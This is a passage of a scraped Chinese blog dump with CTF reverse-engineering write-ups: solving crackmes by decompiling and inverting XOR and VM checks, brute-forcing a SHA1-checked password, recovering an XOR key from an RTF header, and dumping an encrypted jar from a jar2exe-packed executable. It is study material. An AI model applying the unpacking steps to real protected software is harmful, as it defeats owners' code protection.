0x63, 0x4e, 0x66, 0x7b, 0x71, 0x4a, 0x74, 0x76, 0x6b, 0x70, 0x79, 0x66, 0x1c]for i in range(len(s)): s[i] ^= iout = ''for i in range(len(s)): out += chr(s[i])print(out) 输出flag为： 1flag{read_asm_is_the_basic} Py交易本题是python的反编译，使用在线工具或uncompyle6将pyc文件反编译，得到代码 123456789101112131415161718192021222324252627282930313233343536373839404142import base64def encode(message): s = '' for i in message: x = ord(i) ^ 32 x = x + 16 s += chr(x) return base64.b64encode(s)correct = 'XlNkVmtUI1MgXWBZXCFeKY+AaXNt'flag = ''print 'Input flag:'flag = raw_input()if encode(flag) == correct: print 'correct'else: print 'wrong'import base64def encode(message): s = '' for i in message: x = ord(i) ^ 32 x = x + 16 s += chr(x) return base64.b64encode(s)correct = 'XlNkVmtUI1MgXWBZXCFeKY+AaXNt'flag = ''print 'Input flag:'flag = raw_input()if encode(flag) == correct: print 'correct'else: print 'wrong' 研究代码，发现我们只要将correct逆向解密，就可以得到正确的flag，所以得到如下exp： 1234567891011121314import base64correct = 'XlNkVmtUI1MgXWBZXCFeKY+AaXNt'correct = str(base64.b64decode(correct)) # ^SdVkT#S ]`Y\\\\!^)\\x8f\\x80ism# print(correct)correct = '^SdVkT#S ]`Y\\\\!^)\\x8f\\x80ism'flag = ''for s in correct: x = ord(s) x -= 16 i = chr(x ^ 32) flag += iprint(flag) 输出flag为： 1nctf{d3c0mpil1n9_PyC} WxyVM下载下来不知道是什么文件，记事本打开，开头ELF，所以直接拖进IDA反编译，main函数如下： 1234567891011121314151617181920212223__int64 __fastcall main(__int64 a1, char **a2, char **a3){ char v4; // [rsp+Bh] [rbp-5h] signed int i; // [rsp+Ch] [rbp-4h] puts(\"[WxyVM 0.0.1]\"); puts(\"input your flag:\"); scanf(\"%s\", &amp;byte_604B80); v4 = 1; sub_4005B6(); if ( strlen(&amp;byte_604B80) != 24 ) v4 = 0; for ( i = 0; i &lt;= 23; ++i ) { if ( *(&amp;byte_604B80 + i) != dword_601060[i] ) v4 = 0; } if ( v4 ) puts(\"correct\"); else puts(\"wrong\"); return 0LL;} 一开始认为需要输入一个24位的flag，然后和dword_601060每一位都相等即可，但是中间的sub_4005B6()函数对我们输入的flag还进行了一些变换，所以需要把dword_601060对应的进行反变换才能得到应该输入的正确的flag sub_4005B6()函数如下： 12345678910111213141516171819202122232425262728293031323334353637383940__int64 sub_4005B6(){ unsigned int v0; // ST04_4 __int64 result; // rax signed int i; // [rsp+0h] [rbp-10h] char v3; // [rsp+8h] [rbp-8h] for ( i = 0; i &lt;= 14999; i += 3 ) { v0 = byte_6010C0[i]; v3 = byte_6010C0[i + 2]; result = v0; switch ( v0 ) { case 1u: result = byte_6010C0[i + 1]; *(&amp;byte_604B80 + result) += v3; break; case 2u: result = byte_6010C0[i + 1]; *(&amp;byte_604B80 + result) -= v3; break; case 3u: result = byte_6010C0[i + 1]; *(&amp;byte_604B80 + result) ^= v3; break; case 4u: result = byte_6010C0[i + 1]; *(&amp;byte_604B80 + result) *= v3; break; case 5u: result = byte_6010C0[i + 1]; *(&amp;byte_604B80 + result) ^= *(&amp;byte_604B80 + byte_6010C0[i + 2]); break; default: continue; } } return result;} 用IDA将byte_6010C0导出，用python进行逆向处理 1234567891011121314151617181920212223s = [0xc4, 0x34, 0x22, 0xb1, 0xd3, 0x11, 0x97, 0x7, 0xdb, 0x37, 0xc4, 0x6, 0x1d, 0xfc, 0x5b, 0xed, 0x98, 0xdf, 0x94,0xd8, 0xb3, 0x84, 0xcc, 0x8]# dword与char比较，只取最后一位一个字节with open('export_results.txt') as f: #文件里是导出的byte_6010C0 t = f.read().split(' ')# print(len(t))for i in range(5000): v0 = int(t[3 * (4999 - i)], 16) v3 = int(t[3 * (4999 - i) + 2], 16) result = int(t[3 * (4999 - i) + 1], 16) if v0 == 1: s[result] -= v3 elif v0 == 2: s[result] += v3 elif v0 == 3: s[result] ^= v3 elif v0 == 4: s[result] /= v3 elif v0 == 5: s[result] ^= s[v3] else: continueprint(''.join([str(chr(int(i) % 128)) for i in s])) 这里有两件事需要注意，第一是dword只需要取最后一个字节，第二是逆运算时要从最后三位向前计算，最后输出flag: 1nctf{Embr4ce_Vm_j0in_R3} maze极其无聊的迷宫题…… 找到地图、起点终点和上下左右分别对应的键就可以了 1nctf{o0oo00O000oooo..OO} WxyVM2拖进IDA反编译，发现函数非常大，操作特别多，但是仔细看发现最后要验证的都是byte类型，所有对dword的操作都是无效的，所以把所有操作拷贝到文件(export_results.txt)中，先进行过滤操作，过滤出需要的操作,最后的验证过程如下： 12345678910for ( i = 0; i &lt;= 24; ++i ) { if ( *(&amp;byte_694100 + i) != dword_694060[i] ) v4 = 0; } if ( v4 ) puts(\"correct\"); else puts(\"wrong\"); return 0LL; 所以操作之后的数组和dword_694060数组的每个数的最后一位相同，将数组导出，进行逆运算得到原来输入的flag，python代码如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758import rewith open('export_results.txt') as f: s = '' a = f.readline() while a: if re.match(r'(.*)byte_6941(.*);', a): s += a a = f.readline() with open('s.txt', 'w+') as ff: s = s.split('\\n') n = len(s) # print(len(s)) # print(s) for i in range(n): ff.write(s[n - 1 - i].strip() + '\\n')ss = [0xC0, 0x85, 0xF9, 0x6C, 0xE2, 0x14, 0xBB, 0xe4, 0xd, 0x59, 0x1c, 0x23, 0x88, 0x6e, 0x9b, 0xca, 0xba, 0x5c, 0x37, 0xfff, 0x48, 0xd8, 0x1f, 0xab, 0xa5]with open('s.txt') as f: a = f.readline() while a: # print(re.match(r'(.*)byte_6941(.*);', a).groups()) if not re.match(r'(.*)byte_6941(.*);', a).group(1).strip(): s = re.match(r'(.*)byte_6941(.*);', a).group(2).split(' ') # print(s) i = int(s[0], 16) # print(i) i1 = str(ss[i]) if s[1] == '+=': sub = '-' elif s[1] == '-=': sub = '+' else: sub = '^' if re.match(r'(.*)u', s[2]): s2 = re.match(r'(.*)u', s[2]).group(1) else: s2 = s[2] exp = i1 + sub + s2 ss[i] = eval(exp) % 128 else: s = re.match(r'(.*)byte_6941(.*);', a).group(2).split(' ') # print(s) i = int(s[0], 16) # print(i) i1 = str(ss[i]) if re.match(r'(.*)byte_6941(.*);', a).group(1).strip() == '++': sub = '-' if re.match(r'(.*)byte_6941(.*);', a).group(1).strip() == '--': sub = '+' exp = i1 + sub + '1' ss[i] = eval(exp) % 128 a = f.readline() # print(ss)print(''.join([str(chr(i % 128)) for i in ss])) 这里要注意一点，python没有++和–操作，所以直接++和–的传唤算不出正确值，在这里卡了一会儿才发现问题。 运行程序输出flag： 1nctf{th3_vM_w1th0ut_dAta} 你大概需要一个优秀的mac这是一个macos程序，没法直接打开，所以还是拖进IDA反编译，发现需要输入一个56位的flag，然后经过几个函数处理之后与一个数组进行比较，相同则输入的是正确的flag，所以还是一样进行一个逆运算 反编译出来的代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354 scanf(\"%s\", &amp;v4); if ( strlen(&amp;v4) != 56 ) { puts((const char *)err); exit(0); } __strcpy_chk(input, &amp;v4, 100LL); func1((__int64)input); xfun1(); xfun2(); xfun3(); xfun4(); xfun5(); check();//func1 for ( i = 0; i &lt; 57; ++i ) //这里应该是56？ { *(_BYTE *)(a1 + i) ^= 0xDEu; }//xfun1 for ( i = 0; i &lt; 10; ++i ) { input[i] ^= 0xADu; }//xfun2 for ( i = 0; i &lt; 10; ++i ) { input[i + 10] ^= 0xBEu; }//xfun3 for ( i = 0; i &lt; 10; ++i ) { input[i + 20] ^= 0xEFu; }//xfun4 for ( i = 0; i &lt; 10; ++i ) { input[i + 30] ^= 0xABu; }//xfun5 for ( i = 0; i &lt; 16; ++i ) { input[i + 40] ^= 0xEFu; }//check memcpy(v2, &amp;byte_100000ED0, 0xE0uLL); for ( i = 0; i &lt; 56; ++i ) { if ( (char)input[i] != v2[i] ) { puts((const char *)err); exit(0); } } 所以将byte_100000ED0处的数组导出，进行逆运算，代码如下： 12345678910111213141516s = [0x15, 0x1F, 0x12, 0x14, 0x08, 0x3A, 0x46, 0x2C, 0x07, 0x1B, 0x51, 0x13, 0x3F, 0x57, 0x08, 0x05, 0x3F, 0x30, 0x32, 0x51, 0x52, 0x02, 0x6E, 0x78, 0x16, 0x7C, 0x6E, 0x61, 0x70, 0x48, 0x1C, 0x3B, 0x32, 0x2A, 0x13, 0x45, 0x07, 0x2A, 0x18, 0x0C, 0x6E, 0x41, 0x70, 0x04, 0x06, 0x6E, 0x5C, 0x00, 0x42, 0x45, 0x70, 0x5A, 0x02, 0x04, 0x0E, 0x4C]for i in range(10): s[i]^=0xADfor i in range(10,20): s[i]^=0xBEfor i in range(20,30): s[i]^=0xEFfor i in range(30,40): s[i]^=0xABfor i in range(40,56): s[i]^=0xEFfor i in range(56): s[i]^=0xDEprint(''.join([str(chr(i%128)) for i in s])) 运行程序输出flag： 1flag{I5_th1s_7he_PR1c3_I'M_PAyiNG_f0r_my_pA57_m1stAk35?}","link":"/2020/01/11/CGCTF-re%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/"},{"title":"CrackRTF-buuctf","text":"这一题用到了一些windows加密算法中的东西 根据字符串找到了关键的部分函数 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576void FUN_00401690(void){ size_t sVar1; uint uVar2; int iVar3; undefined4 *puVar4; char *pcVar5; undefined4 local_354 [16]; BYTE local_314 [260]; int local_210; char local_20c [260]; byte local_108 [256]; undefined4 uStack8; iVar3 = 0xd4; puVar4 = local_354; while (iVar3 != 0) { iVar3 = iVar3 + -1; *puVar4 = 0xcccccccc; puVar4 = puVar4 + 1; } _memset(local_108,0,0x104); _memset(local_20c,0,0x104); local_210 = 0; FUN_00401e60((byte *)\"pls input the first passwd(1): \"); FUN_00401e00(&amp;DAT_00426104); sVar1 = _strlen((char *)local_108); if (sVar1 != 6) { FUN_00401e60((byte *)\"Must be 6 characters!\\n\"); ExitProcess(0); __chkesp(); } local_210 = FUN_00401c30(local_108); if (local_210 &lt; 100000) { ExitProcess(0); __chkesp(); } FID_conflict:_strcat((char *)local_108,\"@DBApp\"); pcVar5 = local_20c; sVar1 = _strlen((char *)local_108); thunk_FUN_00401230(local_108,sVar1,pcVar5); iVar3 = __strcmpi(local_20c,\"6E32D0943418C2C33385BC35A1470250DD8923A9\"); if (iVar3 == 0) { FUN_00401e60((byte *)\"continue...\\n\\n\"); FUN_00401e60((byte *)\"pls input the first passwd(2): \"); _memset(local_314,0,0x104); FUN_00401e00(&amp;DAT_00426104); sVar1 = _strlen((char *)local_314); if (sVar1 != 6) { FUN_00401e60((byte *)\"Must be 6 characters!\\n\"); ExitProcess(0); __chkesp(); } FID_conflict:_strcat((char *)local_314,(char *)local_108); _memset(local_20c,0,0x104); pcVar5 = local_20c; sVar1 = _strlen((char *)local_314); thunk_FUN_00401040(local_314,sVar1,pcVar5); iVar3 = __strcmpi(\"27019e688a4e62a649fd99cadaafdb4e\",local_20c); if (iVar3 == 0) { uVar2 = thunk_FUN_004014d0((LPCSTR)local_314); if ((uVar2 &amp; 0xff) == 0) { FUN_00401e60((byte *)\"Error!!\\n\"); ExitProcess(0); __chkesp(); } else { FUN_00401e60((byte *)\"bye ~~\\n\"); } } } uStack8 = 0x4018f6; __chkesp(); return;} 需要pass两层密码才可以，仔细看一下加密的部分 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061void __cdecl FUN_00401230(BYTE *param_1,DWORD param_2,LPSTR param_3){ int iVar1; undefined4 *puVar2; undefined4 local_6c [16]; uint local_2c; CHAR local_28 [4]; byte local_24 [20]; DWORD local_10; HCRYPTHASH local_c; HCRYPTPROV local_8; iVar1 = 0x1a; puVar2 = local_6c; while (iVar1 != 0) { iVar1 = iVar1 + -1; *puVar2 = 0xcccccccc; puVar2 = puVar2 + 1; } CryptAcquireContextA(&amp;local_8,(LPCSTR)0x0,(LPCSTR)0x0,1,0xf0000000); iVar1 = __chkesp(); if (iVar1 != 0) { CryptCreateHash(local_8,0x8004,0,0,&amp;local_c); iVar1 = __chkesp(); if (iVar1 == 0) { CryptReleaseContext(local_8,0); __chkesp(); } else { CryptHashData(local_c,param_1,param_2,0); iVar1 = __chkesp(); if (iVar1 == 0) { CryptDestroyHash(local_c); __chkesp(); CryptReleaseContext(local_8,0); __chkesp(); } else { CryptGetHashParam(local_c,2,local_24,&amp;local_10,0); __chkesp(); *param_3 = '\\0'; local_2c = 0; while (local_2c &lt; local_10) { wsprintfA(local_28,\"%02X\",(uint)local_24[local_2c]); __chkesp(); lstrcatA(param_3,local_28); __chkesp(); local_2c = local_2c + 1; } CryptDestroyHash(local_c); __chkesp(); CryptReleaseContext(local_8,0); __chkesp(); } } } local_8 = 0x4013b8; __chkesp(); return;} 第一层加密，重点看看一个函数CryptCreateHash(local_8,0x8004,0,0,&amp;local_c) 上微软查查定义 1234567BOOL CryptCreateHash( HCRYPTPROV hProv, ALG_ID Algid, HCRYPTKEY hKey, DWORD dwFlags, HCRYPTHASH *phHash); hProvA handle to a CSP created by a call to CryptAcquireContext. AlgidAn ALG_ID value that identifies the hash algorithm to use. Valid values for this parameter vary, depending on the CSP that is used. For a list of default algorithms, see Remarks. hKeyIf the type of hash algorithm is a keyed hash, such as the Hash-Based Message Authentication Code (HMAC) or Message Authentication Code (MAC) algorithm, the key for the hash is passed in this parameter. For nonkeyed algorithms, this parameter must be set to zero. For keyed algorithms, the key must be to a block cipher key, such as RC2, that has a cipher mode of Cipher Block Chaining (CBC). dwFlagsThe following flag value is defined. Value Meaning CRYPT_SECRETDIGEST0x00000001 This flag is not used. phHashThe address to which the function copies a handle to the new hash object. When you have finished using the hash object, release the handle by calling the CryptDestroyHash function. 需要关注Algid，定义了加密的方式，在 ALG_ID 查一下0x8004 Identifier Value Description CALG_SHA 0x00008004 SHA hashing algorithm. This algorithm is supported by the Microsoft Base Cryptographic Provider. CALG_SHA1 0x00008004 Same as CALG_SHA. This algorithm is supported by the Microsoft Base Cryptographic Provider. sha1加密，对我们输入的6位纯数字和后面接上的字符串进行sha1加密然后直接进行字符串对比，知道是数字所以爆破非常简单 12345678910import hashlibflag2 = '@DBApp'for i in range(100000, 999999): h2 = hashlib.sha1((str(i) + flag2).encode('utf-8')) flags = h2.hexdigest() if \"6e32d0943418c2c33385bc35a1470250dd8923a9\" == flags: print(str(i) + flag2) print(flags) 输出得到第一部分的密码 12123321@DBApp6e32d0943418c2c33385bc35a1470250dd8923a9 然后看一下下一部分加密 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061void __cdecl FUN_00401040(BYTE *param_1,DWORD param_2,LPSTR param_3){ int iVar1; undefined4 *puVar2; undefined4 local_68 [16]; uint local_28; CHAR local_24 [4]; byte local_20 [16]; DWORD local_10; HCRYPTHASH local_c; HCRYPTPROV local_8; iVar1 = 0x19; puVar2 = local_68; while (iVar1 != 0) { iVar1 = iVar1 + -1; *puVar2 = 0xcccccccc; puVar2 = puVar2 + 1; } CryptAcquireContextA(&amp;local_8,(LPCSTR)0x0,(LPCSTR)0x0,1,0xf0000000); iVar1 = __chkesp(); if (iVar1 != 0) { CryptCreateHash(local_8,0x8003,0,0,&amp;local_c); iVar1 = __chkesp(); if (iVar1 == 0) { CryptReleaseContext(local_8,0); __chkesp(); } else { CryptHashData(local_c,param_1,param_2,0); iVar1 = __chkesp(); if (iVar1 == 0) { CryptDestroyHash(local_c); __chkesp(); CryptReleaseContext(local_8,0); __chkesp(); } else { CryptGetHashParam(local_c,2,local_20,&amp;local_10,0); __chkesp(); *param_3 = '\\0'; local_28 = 0; while (local_28 &lt; local_10) { wsprintfA(local_24,\"%02X\",(uint)local_20[local_28]); __chkesp(); lstrcatA(param_3,local_24); __chkesp(); local_28 = local_28 + 1; } CryptDestroyHash(local_c); __chkesp(); CryptReleaseContext(local_8,0); __chkesp(); } } } local_8 = 0x4011c8; __chkesp(); return;} 和上面的加密几乎一样，但是这次是0x8003，再查一查 Identifier Value Description CALG_MD5 0x00008003 MD5 hashing algorithm. This algorithm is supported by the Microsoft Base Cryptographic Provider. md5加密，并且没有限定字符的范围，下辈子都跑不出来 再往下面看，两层加密都通过之后 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657void __cdecl FUN_004014d0(LPCSTR param_1){ int iVar1; undefined4 *puVar2; undefined4 local_64 [16]; undefined4 local_24; LPCVOID local_20; undefined4 local_1c; DWORD local_18; uint local_14; HGLOBAL local_10; HRSRC local_c; HANDLE local_8; iVar1 = 0x18; puVar2 = local_64; while (iVar1 != 0) { iVar1 = iVar1 + -1; *puVar2 = 0xcccccccc; puVar2 = puVar2 + 1; } local_8 = (HANDLE)0x0; local_c = (HRSRC)0x0; local_10 = (HGLOBAL)0x0; local_14 = 0; local_18 = 0; local_1c = 0; local_20 = (LPCVOID)0x0; local_24 = 0; FindResourceA((HMODULE)0x0,(LPCSTR)0x65,\"AAA\"); local_c = (HRSRC)__chkesp(); if (local_c != (HRSRC)0x0) { SizeofResource((HMODULE)0x0,local_c); local_14 = __chkesp(); LoadResource((HMODULE)0x0,local_c); local_10 = (HGLOBAL)__chkesp(); if (local_10 != (HGLOBAL)0x0) { LockResource(local_10); local_20 = (LPCVOID)__chkesp(); thunk_FUN_00401420(param_1,(int)local_20,local_14); CreateFileA(\"dbapp.rtf\",0x10000000,0,(LPSECURITY_ATTRIBUTES)0x0,2,0x80,(HANDLE)0x0); local_8 = (HANDLE)__chkesp(); if (local_8 != (HANDLE)0xffffffff) { WriteFile(local_8,local_20,local_14,&amp;local_18,(LPOVERLAPPED)0x0); iVar1 = __chkesp(); if (iVar1 != 0) { CloseHandle(local_8); __chkesp(); } } } } local_8 = (HANDLE)0x40162d; __chkesp(); return;} 写了一个dbapp.rtf，写入的内容在上面一个函数 123456789101112131415161718192021222324252627282930void __cdecl FUN_00401420(LPCSTR param_1,int param_2,uint param_3){ uint uVar1; int iVar2; undefined4 *puVar3; undefined4 local_50 [16]; uint local_10; LPCSTR local_c; undefined4 local_8; iVar2 = 0x13; puVar3 = local_50; while (iVar2 != 0) { iVar2 = iVar2 + -1; *puVar3 = 0xcccccccc; puVar3 = puVar3 + 1; } lstrlenA(param_1); uVar1 = __chkesp(); local_c = param_1; local_10 = 0; while (local_10 &lt; param_3) { *(byte *)(param_2 + local_10) = *(byte *)(param_2 + local_10) ^ param_1[local_10 % uVar1]; local_10 = local_10 + 1; } local_8 = 0x4014a3; __chkesp(); return;} 发现前面不知从哪里获取了一些内容，然后和我们输入的密码进行了一个循环异或，写入一个rtf文件 这里有一个点就是rtf文件的文件头是固定的6个字符，可以通过这里来算出来输入的第二次密码是什么 可以用ResourceHacker看一下AAA到底是什么 然后异或一下出来密码 123456789s = \"{\\\\rtf1\" a = [0x05,0x7D,0x41,0x15,0x26,0x01] flag = \"\"for i in range(0,len(s)): x = ord(s[i]) ^ a[i] flag += chr(x)print(flag) 得到第二个密码~!3a@0 两个都通过后会生成一个rtf文件，内容是flag 1Flag{N0_M0re_Free_Bugs} 但是提交的时候要交小写的flag","link":"/2020/04/01/CrackRTF-buuctf/"},{"title":"Fibonacci-JavisOJ-wp","text":"这题涉及到jar2exe的知识，所以单独拿出来写一下，顺便写一写jar2exe怎么入手 这种方法并不适用于jar2exe当前的最新版(2.1.7)，经过我的测试2.1.2试可用的，而且由于2.1.2的第三种加密方式还没有这么激进，后续其它版本应该也是支持的，还需要再试验。 准备工作拿到题目DIE查一下，发现不是一个普通的可执行文件 也就是说这本来是一个jar文件，通过jar2exe的方式转换成了windows可执行文件 Jar2Exe一共有3种保护方式 不隐藏也不加密 隐藏 隐藏且加密 Level1第一种方式非常简单，只需要在16进制编辑器中找到第一个PK，即zip的文件头，然后把这之后的另存为新文件，就可以了。但是这一题并不是采用这种方式，以这种方式提取出来的程序只包含很多生成出来的附加文件。 其实也可以直接用winrar打开 Level2第二种方式隐藏了原本的jar文件，可以通过RH来查看文件，这部分被放在了RCData里 Level3本题采用的是第三种，就像第二种一样，原先的jar文件被隐藏了，但是第三种方式还进行加密，并且将整个jar文件的结构和类名全部都混淆了(经过实验在jar2exe 2.1.2中并不会对文件结构进行破坏)，不会像第二种方式中直接dump出来一个完整的jar文件 Dump要解决这道题首先就是要把有效的代码Dump出来，这部分的内容对于第二种和第三种方式是基本一样的。 从上面可以看到这段密文的偏移，然后x64dbg打开之后，在程序内存处根据偏移找到这段内存，设内存访问断点，程序运行起来，在dec r8d处停下来，此时如果是采用第二种方式加密，经过一个简单的循环之后就可以把原jar给dump出来，但是这里还需要经过一些加密 根据脱壳的经验，找到向上跳转的最外层，就是最后一个跳转，然后直接执行到下一行 首先观察变红色的值即发生改变的值，发现r14和r15的值很可疑，观察前面的代码，发现会在循环处inc r15d和inc r14，根据这两个寄存器的值推断，r14中的值是解密后数据的结束位置，r15中的值B8B为解密后数据的长度，因此，利用Scylla把这部分内容dump出来，出题人使用的jar2exe版本里面的文件名都是混淆过的，需要手动修复成jar文件，找到其中的两个class文件，IDEA直接就可以反编译。 逆向dump出来的文件包含了两个类，第一个类包含主要的处理过程 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475//// Source code recreated from a .class file by IntelliJ IDEA// (powered by Fernflower decompiler)//package top.phrack.ctf.Fibonacci;import java.util.Scanner;public class Fibonacci { public Fibonacci() { } private static void heheda() { String bb = new String(b.x); String cb = new String(b.y); hello(cb, bb); } public static void main(String[] args) { System.out.println(\"来让我们玩一个数列游戏：\"); System.out.println(\"a[0]=0,a[1]=1\"); System.out.println(\"a[2]=1,a[3]=2\"); System.out.println(\"a[4]=3,a[5]=5\"); System.out.println(\"..............\"); System.out.println(\"请计算a[100000000000000]：\"); Scanner scan = new Scanner(System.in); String read = scan.nextLine(); System.out.println(\"答案错误！！\"); } private static String hello(String aaa, String bbb) { int[] iS = new int[256]; byte[] iK = new byte[256]; int j; for(j = 0; j &lt; 256; iS[j] = j++) { } int j = true; for(short i = 0; i &lt; 256; ++i) { iK[i] = (byte)bbb.charAt(i % bbb.length()); } j = 0; int i; for(i = 0; i &lt; 255; ++i) { j = (j + iS[i] + iK[i]) % 256; int temp = iS[i]; iS[i] = iS[j]; iS[j] = temp; } i = 0; j = 0; char[] iInputChar = aaa.toCharArray(); char[] iOutputChar = new char[iInputChar.length]; for(short x = 0; x &lt; iInputChar.length; ++x) { i = (i + 1) % 256; j = (j + iS[i]) % 256; int temp = iS[i]; iS[i] = iS[j]; iS[j] = temp; int t = (iS[i] + iS[j] % 256) % 256; int iY = iS[t]; char iCY = (char)iY; iOutputChar[x] = (char)(iInputChar[x] ^ iCY); } return new String(iOutputChar); }} 由此可见什么斐波那契数列并没有什么用，真正有用的是heheda()和hello()，其中调用了b类的数据 1234567891011121314//// Source code recreated from a .class file by IntelliJ IDEA// (powered by Fernflower decompiler)//package top.phrack.ctf.Fibonacci;public class b { public static char[] x = new char[]{'}', '\\u0010', 'ý', 'É', '\\u000b', '\\u0016', '9', 'D', '7', ',', ' ', 'Í'}; public static char[] y = new char[]{'t', '\\u0096', '®', 'D', '´', 'Z', 'Ö', '½', 'O', '5', '\\u0085', '\\n', '+', '+', '½', 'Ù', 'O', '`', '\\u0013', '\\u008a', 'Ç', '\\u0080', '@', 'Ü', 'Þ', 'ê', '\\u000b', '¯', 'ä', '\\u0081'}; public b() { }} 所以直接在java环境里运行一下就可以了 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566//Main.javapackage com.company;public class Main { private static void heheda() { String bb = new String(b.x); String cb = new String(b.y); System.out.println(hello(cb, bb)); } public static void main(String[] args) { heheda(); } private static String hello(String aaa, String bbb) { int[] iS = new int[256]; byte[] iK = new byte[256]; int j; for (j = 0; j &lt; 256; iS[j] = j++) { } for (short i = 0; i &lt; 256; ++i) { iK[i] = (byte) bbb.charAt(i % bbb.length()); } j = 0; int i; for (i = 0; i &lt; 255; ++i) { j = (j + iS[i] + iK[i]) % 256; int temp = iS[i]; iS[i] = iS[j]; iS[j] = temp; } i = 0; j = 0; char[] iInputChar = aaa.toCharArray(); char[] iOutputChar = new char[iInputChar.length]; for (short x = 0; x &lt; iInputChar.length; ++x) { i = (i + 1) % 256; j = (j + iS[i]) % 256; int temp = iS[i]; iS[i] = iS[j]; iS[j] = temp; int t = (iS[i] + iS[j] % 256) % 256; int iY = iS[t]; char iCY = (char) iY; iOutputChar[x] = (char) (iInputChar[x] ^ iCY); } return new String(iOutputChar); }}//b.javapackage com.company;public class b { public static char[] x = new char[]{'}', '\\u0010', 'ý', 'É', '\\u000b', '\\u0016', '9', 'D', '7', ',', ' ', 'Í'}; public static char[] y = new char[]{'t', '\\u0096', '®', 'D', '´', 'Z', 'Ö', '½', 'O', '5', '\\u0085', '\\n', '+', '+', '½', 'Ù', 'O', '`', '\\u0013', '\\u008a', 'Ç', '\\u0080', '@', 'Ü', 'Þ', 'ê', '\\u000b', '¯', 'ä', '\\u0081'}; public b() { }} 运行直接输出flag 1PCTF{1ts_not_5c2ipt_Chall3nge}","link":"/2020/04/01/Fibonacci-JavisOJ-wp/"},{"title":"IDA常用宏定义","text":"保存一下便于查询。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300/* This file contains definitions used by the Hex-Rays decompiler output. It has type definitions and convenience macros to make the output more readable. Copyright (c) 2007-2011 Hex-Rays*/#if defined(__GNUC__) typedef long long ll; typedef unsigned long long ull; #define __int64 long long #define __int32 int #define __int16 short #define __int8 char #define MAKELL(num) num ## LL #define FMT_64 \"ll\"#elif defined(_MSC_VER) typedef __int64 ll; typedef unsigned __int64 ull; #define MAKELL(num) num ## i64 #define FMT_64 \"I64\"#elif defined (__BORLANDC__) typedef __int64 ll; typedef unsigned __int64 ull; #define MAKELL(num) num ## i64 #define FMT_64 \"L\"#else #error \"unknown compiler\"#endiftypedef unsigned int uint;typedef unsigned char uchar;typedef unsigned short ushort;typedef unsigned long ulong;typedef char int8;typedef signed char sint8;typedef unsigned char uint8;typedef short int16;typedef signed short sint16;typedef unsigned short uint16;typedef int int32;typedef signed int sint32;typedef unsigned int uint32;typedef ll int64;typedef ll sint64;typedef ull uint64;// Partially defined types:#define _BYTE uint8#define _WORD uint16#define _DWORD uint32#define _QWORD uint64#if !defined(_MSC_VER)#define _LONGLONG __int128#endif#ifndef _WINDOWS_typedef int8 BYTE;typedef int16 WORD;typedef int32 DWORD;typedef int32 LONG;#endiftypedef int64 QWORD;#ifndef __cplusplustypedef int bool; // we want to use bool in our C programs#endif// Some convenience macros to make partial accesses nicer// first unsigned macros:#define LOBYTE(x) (*((_BYTE*)&amp;(x))) // low byte#define LOWORD(x) (*((_WORD*)&amp;(x))) // low word#define LODWORD(x) (*((_DWORD*)&amp;(x))) // low dword#define HIBYTE(x) (*((_BYTE*)&amp;(x)+1))#define HIWORD(x) (*((_WORD*)&amp;(x)+1))#define HIDWORD(x) (*((_DWORD*)&amp;(x)+1))#define BYTEn(x, n) (*((_BYTE*)&amp;(x)+n))#define WORDn(x, n) (*((_WORD*)&amp;(x)+n))#define BYTE1(x) BYTEn(x, 1) // byte 1 (counting from 0)#define BYTE2(x) BYTEn(x, 2)#define BYTE3(x) BYTEn(x, 3)#define BYTE4(x) BYTEn(x, 4)#define BYTE5(x) BYTEn(x, 5)#define BYTE6(x) BYTEn(x, 6)#define BYTE7(x) BYTEn(x, 7)#define BYTE8(x) BYTEn(x, 8)#define BYTE9(x) BYTEn(x, 9)#define BYTE10(x) BYTEn(x, 10)#define BYTE11(x) BYTEn(x, 11)#define BYTE12(x) BYTEn(x, 12)#define BYTE13(x) BYTEn(x, 13)#define BYTE14(x) BYTEn(x, 14)#define BYTE15(x) BYTEn(x, 15)#define WORD1(x) WORDn(x, 1)#define WORD2(x) WORDn(x, 2) // third word of the object, unsigned#define WORD3(x) WORDn(x, 3)#define WORD4(x) WORDn(x, 4)#define WORD5(x) WORDn(x, 5)#define WORD6(x) WORDn(x, 6)#define WORD7(x) WORDn(x, 7)// now signed macros (the same but with sign extension)#define SLOBYTE(x) (*((int8*)&amp;(x)))#define SLOWORD(x) (*((int16*)&amp;(x)))#define SLODWORD(x) (*((int32*)&amp;(x)))#define SHIBYTE(x) (*((int8*)&amp;(x)+1))#define SHIWORD(x) (*((int16*)&amp;(x)+1))#define SHIDWORD(x) (*((int32*)&amp;(x)+1))#define SBYTEn(x, n) (*((int8*)&amp;(x)+n))#define SWORDn(x, n) (*((int16*)&amp;(x)+n))#define SBYTE1(x) SBYTEn(x, 1)#define SBYTE2(x) SBYTEn(x, 2)#define SBYTE3(x) SBYTEn(x, 3)#define SBYTE4(x) SBYTEn(x, 4)#define SBYTE5(x) SBYTEn(x, 5)#define SBYTE6(x) SBYTEn(x, 6)#define SBYTE7(x) SBYTEn(x, 7)#define SBYTE8(x) SBYTEn(x, 8)#define SBYTE9(x) SBYTEn(x, 9)#define SBYTE10(x) SBYTEn(x, 10)#define SBYTE11(x) SBYTEn(x, 11)#define SBYTE12(x) SBYTEn(x, 12)#define SBYTE13(x) SBYTEn(x, 13)#define SBYTE14(x) SBYTEn(x, 14)#define SBYTE15(x) SBYTEn(x, 15)#define SWORD1(x) SWORDn(x, 1)#define 